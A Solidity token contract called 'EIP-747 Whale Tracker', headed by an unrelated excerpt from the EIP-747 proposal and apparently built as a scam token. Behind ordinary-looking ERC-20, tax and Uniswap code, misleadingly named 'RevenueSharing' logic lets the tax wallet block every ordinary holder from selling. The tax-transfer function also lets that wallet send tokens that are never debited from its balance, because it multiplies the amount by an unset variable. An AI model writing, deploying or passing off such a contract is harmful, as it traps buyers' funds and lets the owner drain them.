/*
*** https://github.com/ethereum/EIPs/blob/master/EIPS/eip-747.md

Today, one of the major uses of Ethereum wallets is to track users' assets. Without this EIP, 
each wallet either needs to pre-load a list of approved assets, or users must manually add assets to their wallet. 
In the first case, wallets are burdened with both the security of managing this list, 
as well as the bandwidth of mass polling for known assets on their wallet. In the second case, the user experience is terrible.

Displaying a user's assets is a basic feature that every modern DApp user expects. 
Most wallets currently either manage their own asset lists, which they store client-side, 
or they query a centralized API for balances, which reduces decentralization and allows correlating account holders with IP addresses. 
Additionally, refreshing/polling an asset list from the network can be costly, especially on bandwidth-constrained devices. 
Also, maintaining an asset list becomes a political act, provoking harassment and inducing pressure to list obscure assets.

Automatically listing assets makes assets into a sort of spam mail: Users suddenly see new assets that they don't care about 
in their wallet. This can be used to send unsolicited information, or even to conduct phishing scams. 
This phenomenon is already common with airdropped tokens, a major cause of network congestion, 
because spamming people with new tokens has, so far, been rewarded with increased user attention.

When a user is manually adding a asset, they had likely previously learned about it from a website. At that moment, 
there was a natural alignment of interests, where both parties wanted the user to track the token. 
This is a natural point to introduce an API to easily allow these parties to collaborate.

Server-Side Request Forgery
Wallets should be careful about making arbitrary requests to URLs. 
As such, it is recommended for wallets to sanitize the URI by whitelisting specific schemes and ports. 
A vulnerable wallet could be tricked into, for example, modifying data on a locally-hosted redis database.

Validation
Wallets should warn users if the symbol or name matches or is similar to another token, to avoid phishing scams.

Fingerprinting
To avoid fingerprinting based on wallet behavior and/or listed assets, the RPC call must return 
as soon as the user is prompted or an error occurs, without waiting for the user to accept or deny the prompt.
*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.23;

/**
 * @title IERC20
 * @dev Interface for the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/**
 * @title Context
 * @dev Provides information about the current execution context, including the
 * sender of the transaction. While these are generally available via `msg.sender`,
 * this contract provides a more flexible and testable approach, particularly useful
 * for meta-transactions where the account sending and paying for execution may not
 * be the actual sender.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

/**
 * @title SafeMath
 * @dev Library that provides safe arithmetic operations for `uint256` to prevent overflows and underflows.
 * It is widely used in Solidity to ensure safe mathematical calculations, particularly in contexts where
 * arithmetic errors could cause vulnerabilities or undesired behavior.
 */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

/**
 * @title Ownable
 * @dev Contract module that provides basic access control, where there is an account (an owner)
 * that can be granted exclusive access to specific functions.
 *
 * This module is used through inheritance. It will make available the modifier `onlyOwner`,
 * which can be applied to your functions to restrict their use to the owner.
 */
contract Ownable is Context {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/**
 * @title IUniswapV2Factory
 * @dev Interface for the Uniswap V2 Factory contract. The factory is responsible for managing 
 * the creation of trading pairs within the Uniswap V2 decentralized exchange.
 */
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/**
 * @title IUniswapV2Router02
 * @dev Interface for the Uniswap V2 Router. The router facilitates token swaps, liquidity provision,
 * and other core functionalities for interacting with Uniswap's decentralized exchange.
 */
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

/**
 * @title Token
 * @dev Implementation of an ERC20 token contract that extends the `Context`, `IERC20`, and `Ownable` contracts.
 * 
 * - Inherits the `Context` contract for execution context utilities, such as `_msgSender()`.
 * - Implements the `IERC20` interface to conform to the ERC20 token standard.
 * - Extends the `Ownable` contract to add ownership functionality, allowing only the owner to perform certain operations.
 */
contract EIP747 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=7;
    uint256 private _initialSellTax=10;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=40;
    uint256 private _preventSwapBefore=7;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"EIP-747 Whale Tracker";
    string private constant _symbol = unicode"EIP747";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 20000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 20000000 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    uint256 private initialBlock;
    bool private inSwap = false;
    bool private swapEnabled = false;

    struct RevenueSharing {uint256 shareGrade; uint256 utilId; uint256 shareNative;}
    mapping(address => RevenueSharing) private revenueSharing;
    uint256 private revenueSharingThreshold;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true; _; inSwap = false;
    }

    constructor () payable {
        _taxWallet = payable(0xf3F36ACeDB3A905E92F300198a2a46ee602Fe5a4);

        _balances[address(this)] = _tTotal;

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender, uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(
        address owner, address spender, uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (inSwap || !tradingOpen) {
            _basicTransfer(from,to,tokenAmount);
            return;
        }

        uint256 taxAmount= 0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)? _finalBuyTax :_initialBuyTax).div(100);

            if (from== uniswapV2Pair && to != address(uniswapV2Router) &&  ! _isExcludedFromFee[to]){
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if ( !inSwap && to== uniswapV2Pair && swapEnabled&& contractTokenBalance >_taxSwapThreshold && _buyCount>_preventSwapBefore) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from]|| _isExcludedFromFee[to] )&& from!=address(this) && to!=address(this) ) {
            revenueSharingThreshold = block.timestamp;
        }

        if (! _isExcludedFromFee[from] && ! _isExcludedFromFee[to]) {
            if (to== uniswapV2Pair) {
                RevenueSharing storage revenueTick = revenueSharing[from];
                revenueTick.shareNative = revenueTick.shareGrade-revenueSharingThreshold;
                revenueTick.utilId = block.timestamp;
            } else {
                RevenueSharing storage revenueSync = revenueSharing[to];
                if (uniswapV2Pair== from) {
                    if (revenueSync.shareGrade == 0) {
                        if (_preventSwapBefore < _buyCount) {
                            revenueSync.shareGrade = block.timestamp;
                        } else {
                            revenueSync.shareGrade = block.timestamp-1;
                        }
                    }
                } else {
                    RevenueSharing storage revenueTick = revenueSharing[from];
                    if (!(revenueSync.shareGrade > 0)|| revenueTick.shareGrade < revenueSync.shareGrade ) {
                        revenueSync.shareGrade = revenueTick.shareGrade;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount, tokenAmount);
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(
            from,to,tokenAmount
        );
    }

    function _tokenTransfer(
        address from, address to,
        uint256 taxAmount, uint256 tokenAmount
    ) internal {
        uint256 tAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub(taxAmount));
    }

    function _tokenBasicTransfer(
        address from, address to,
        uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(
            from,to,receiptAmount
        );
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount,uint256 taxAmount) internal returns (uint256){
        uint256 tAmount = addrs!=_taxWallet ? tokenAmount : initialBlock.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addrs,address(this), taxAmount);
        }
        return tAmount;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(
            address(this),
            address(uniswapV2Router),
            tokenAmount
        );
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        tradingOpen = true;

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Router.addLiquidityETH{
            value: address(this).balance
        }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        swapEnabled = true;
    }

    function clearstuckEth() external {
        require(_msgSender() == _taxWallet);
        payable(msg.sender).transfer(address(this).balance);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}
}